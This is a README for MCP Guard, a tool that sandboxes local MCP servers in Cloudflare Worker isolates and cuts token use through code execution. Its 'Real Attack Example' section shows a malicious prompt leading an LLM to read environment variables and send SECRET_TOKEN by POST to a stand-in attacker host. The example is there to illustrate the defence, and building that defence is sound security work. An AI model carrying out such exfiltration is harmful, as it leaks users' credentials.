# MCP Guard

> Use local MCP servers securely with zero-trust isolation while reducing context window token usage by up to 98%.

*⚡ This implementation is based on [Code execution with MCP: Building more efficient agents](https://www.anthropic.com/engineering/code-execution-with-mcp) by Anthropic. It uses [Wrangler](https://www.npmjs.com/package/wrangler) for local MCP isolation using [Dynamic Worker Loaders](https://blog.cloudflare.com/code-mode/) as described in [Code Mode: the better way to use MCP](https://developers.cloudflare.com/workers/runtime-apis/bindings/worker-loader/) by Cloudflare.*

[](https://opensource.org/licenses/MIT)
[](https://www.typescriptlang.org/)
[](https://nodejs.org/)

[](https://cursor.com/en/install-mcp?name=mcpguard&config=eyJjb21tYW5kIjoibnB4IiwiYXJncyI6WyIteSIsIm1jcGd1YXJkIl19)

## 🛡️ How It Works: A Simple Example

```mermaid
flowchart LR
    User["👤 User"] -->|"&nbsp;&nbsp;Prompt&nbsp;&nbsp;"| LLM["🤖 LLM"]

    LLM -->|"&nbsp;&nbsp;⚠️ <b>Without MCP Guard&nbsp;&nbsp;"| WithoutGuard
    LLM -->|"&nbsp;&nbsp;✅ <b>With MCP Guard&nbsp;&nbsp;"| WithGuard

    subgraph WithoutGuard["<p style='height:6px; width: 600px;'></p>⚠️ No Code Isolation - LLM invokes MCP tools directly"]
        direction LR
        WithoutGuardWarning["MCP Can Access:<br/>⚠️ Filesystem<br/>⚠️ Env Variables<br/>⚠️ Network<br/>⚠️ System"]
        WithoutGuardWarning -->|"&nbsp;&nbsp;Direct Execution&nbsp;&nbsp;"| TargetMCPServer["MCP Tools"]
    end

    subgraph WithGuard["<p style='height:6px; width: 600px;'></p>✅ Worker Isolates Code - LLM generates code to interface with MCP tools"]
        direction LR
        WithGuardBenefits["MCP Blocked From:<br/>✅ Filesystem<br/>✅ Env Variables<br/>✅ Network<br/>✅ System"]
        WithGuardBenefits -.->|"Indirect<br/>&nbsp;&nbsp;Service Binding&nbsp;&nbsp;"| MCP["MCP Tools"] 
    end


    style WithoutGuardWarning text-align:left
    style WithGuardBenefits text-align:left
    style WithoutGuard stroke:#dd0000,stroke-width:4px
    style WithGuard stroke:#00aa00,stroke-width:4px
    style MCP stroke:#888888,stroke-width:2px
```



### Real Attack Example

**Scenario:** Malicious prompt tries to steal your secrets

**Traditional MCP:**
```
User: "Show me all environment variables"
LLM: Calls read_env() tool
Result: ⚠️ SECRET_TOKEN=xxxxxxxxxxxx exposed
LLM: Exfiltrate SECRET_TOKEN via POST to "https://attacker.com/steal"
Result: ⚠️ Fetch request succeeds
```

**With MCP Guard:**
```
User: "Show me all environment variables"
LLM: Writes code: console.log(process.env)
Result: ✅ ReferenceError: process is not defined
        Your secret stays safe
LLM: Exfiltrate SECRET_TOKEN via POST to "https://attacker.com/steal"
Result: ✅ Network access blocked
```

## 🔒 Security: Zero-Trust Execution

MCP Guard runs all code in local Cloudflare Worker isolates with **zero access** to your filesystem, environment variables, network, or system, which protects against data exfiltration, credential theft, filesystem access, arbitrary code execution, process manipulation, SSRF attacks, code injection, supply chain attacks, and more.

**Three layers of protection:**
1. **V8 Isolate Sandboxing** - Complete process isolation
2. **Network Isolation** - No outbound network access, only MCP bindings can communicate
3. **Code Validation** - Blocks dangerous patterns before execution

📖 **[Read the security analysis](docs/SECURITY_ANALYSIS.md)** for attack vector details and defense-in-depth architecture.

## ⚡ Efficiency: Code Mode Execution

Traditional MCP tool calling wastes your context window. MCP Guard uses **code mode** to reduce token usage by up to 98%.

### Example: Generating a Jira Sprint Report

**Traditional approach:** The LLM calls tools step-by-step, and every result flows through the context window:

1. Fetch 200 sprint tickets → **25,000 tokens** loaded into context
2. LLM reads all tickets to count completed vs blocked
3. Fetch time tracking data → **5,000 tokens** more
4. Generate summary → **300 tokens**

**Total:** 30,300 tokens just to count tickets and generate a simple report.

**With MCP Guard:** The code runs in a secure sandbox, processes all 200 tickets, and only sends back the final summary. The LLM never has to read the individual tickets:

```typescript
// Fetch tickets, filter and count in code, return only the summary
import * as jira from './servers/jira';

const tickets = await jira.getSprintTickets({ sprintId: '123' });
const stats = {
  completed: tickets.filter(t => t.status === 'Done').length,
  blocked: tickets.filter(t => t.labels.includes('blocked')).length,
  total: tickets.length
};

console.log(`Sprint Summary: ${stats.completed}/${stats.total} completed, ${stats.blocked} blocked`);
```

**Result:** Instead of 30,300 tokens, you use ~750 tokens. **97.5% reduction.**

**Benefits:**
- 📉 **Up to 98% reduction** in token usage
- 🚀 **60x more tasks** in the same context window
- 💰 **Massive cost savings** on LLM API calls
- ⚡ **No round-trips** for intermediate results


## 🏃 Quick Start

**Requires:** [Node.js 20+](https://nodejs.org/) installed

### Installation Steps

1. **Click the "Install MCP Server" button** above (or manually add to Cursor/Claude config):
   ```json
   {
     "mcpServers": {
       "mcpguard": {
         "command": "npx",
         "args": ["-y", "mcpguard"]
       }
     }
   }
   ```

2. **Run install to guard existing MCPs:**
   ```bash
   npx mcpguard install
   ```
   This automatically:
   - Detects your IDE config (Cursor or Claude Code)
   - Disables all other MCPs (moves them to `_mcpguard_disabled`)
   - Ensures mcpguard is active
   - All MCPs are now only accessible through MCPGuard

3. **Restart your IDE** for changes to take effect.

4. **That's it!** MCPGuard will auto-discover and guard any new MCPs you add to your config.

### Restoring Direct MCP Access

If you want to restore direct MCP access:
```bash
npx mcpguard restore
```
Then restart your IDE.

You'll see a prompt like this:

```
╔═══════════════════════════════════════════════════════════╗
║              MCP Guard - Interactive CLI                  ║
╚═══════════════════════════════════════════════════════════╝

Type "help" for available commands.
Type "exit" to quit.

mcpguard>
```

### Basic Usage

1. **Load an MCP server:**
   ```
   load
   ```
   Enter the MCP name, command (e.g., `npx`), args, and environment variables.

2. **Get the TypeScript API schema:**
   ```
   schema
   ```
   Enter the MCP ID to see available tools as TypeScript APIs.

3. **Execute code:**
   ```
   execute
   ```
   Enter the MCP ID and TypeScript code to run in the isolated Worker.

4. **List loaded MCPs:**
   ```
   list
   ```

## 🧪 Testing with GitHub MCP

Follow these steps to test the system with GitHub MCP:

### 1. Start the CLI

```bash
npm run cli
```

### 2. Load the GitHub MCP Server

At the `mcpguard>` prompt, type:

```
load
```

You'll be prompted for information. Enter:

- **MCP name**: `github` (or any name you like)
- **Command**: `npx`
- **Args**: `-y,@modelcontextprotocol/server-github` (comma-separated)
- **Environment variables**: `{"GITHUB_PERSONAL_ACCESS_TOKEN":"ghp_your_token_here"}` (as JSON)

**Example interaction:**

```
mcpguard> load
MCP name: github
Command (e.g., npx): npx
Args (comma-separated, or press Enter for none): -y,@modelcontextprotocol/server-github
Environment variables as JSON (or press Enter for none): {"GITHUB_PERSONAL_ACCESS_TOKEN":"ghp_your_actual_token"}

Loading MCP server...
```

### 3. Check What Was Loaded

Type:

```
list
```

You should see your loaded MCP server with its ID, status, and available tools.

### 4. Get the TypeScript API Schema

Type:

```
schema
```

Enter the MCP ID from the previous step. You'll see the TypeScript API definitions that were generated from the MCP tools.

### 5. Execute Some Code

Type:

```
execute
```

You'll be prompted:
- **MCP ID**: Enter the ID from step 3
- **TypeScript code**: Enter your code (end with a blank line)
- **Timeout**: Press Enter for default (30000ms)

**Example code to test:**

```typescript
// Simple test
console.log('Hello from Worker isolate!');
const result = { message: 'Test successful', timestamp: Date.now() };
console.log(JSON.stringify(result));
```

### 6. View Metrics

Type:

```
metrics
```

This shows performance metrics including:
- Total executions
- Success rate
- Average execution time
- Estimated tokens saved

### 7. Clean Up

When done testing, unload the MCP:

```
unload
```

Enter the MCP ID to clean up resources.

## 📖 Available CLI Commands

| Command | Description |
|---------|-------------|
| `load` | Load an MCP server into an isolated Worker |
| `execute` | Execute TypeScript code against a loaded MCP |
| `list` | List all loaded MCP servers |
| `schema` | Get TypeScript API schema for an MCP |
| `unload` | Unload an MCP server and clean up |
| `metrics` | Show performance metrics |
| `help` | Show help message |
| `exit` | Exit the CLI |

## 🔧 Using as an MCP Server (for AI Agents)

Start the MCP server:

```bash
npm run dev
```

Configure your AI agent (Claude Desktop, Cursor IDE, etc.):

```json
{
  "mcpServers": {
    "mcpguard": {
      "command": "node",
      "args": ["/path/to/mcpguard/dist/server/index.js"]
    }
  }
}
```

**Available MCP Tools:**
- `execute_code` - PRIMARY tool for interacting with MCPs. Auto-loads MCPs from IDE config if needed. Use this instead of calling MCP tools directly.
- `search_mcp_tools` - Discover which MCPs are configured in your IDE. Shows all configured MCPs (except mcpguard) with their status and available tools.
- `list_saved_mcp_configs` - List all MCP configurations in your IDE config with loaded status and tool counts.
- `load_mcp_server` - Manually load an MCP server (usually not needed - execute_code auto-loads)
- `list_available_mcps` - List all currently loaded MCP servers
- `get_mcp_schema` - Get TypeScript API definition for a loaded MCP
- `unload_mcp_server` - Unload an MCP server
- `get_metrics` - Get performance metrics

## 📜 License

MIT License - see [LICENSE](./LICENSE) file for details.

## 🙏 Acknowledgments

- [Anthropic](https://www.anthropic.com/) for the Model Context Protocol
- [Cloudflare](https://www.cloudflare.com/) for Workers and the Worker Loader API
- The MCP community for building amazing MCP servers

---

**Ready to get started?** Run `npm install` and then `npm run cli` to begin! 🚀
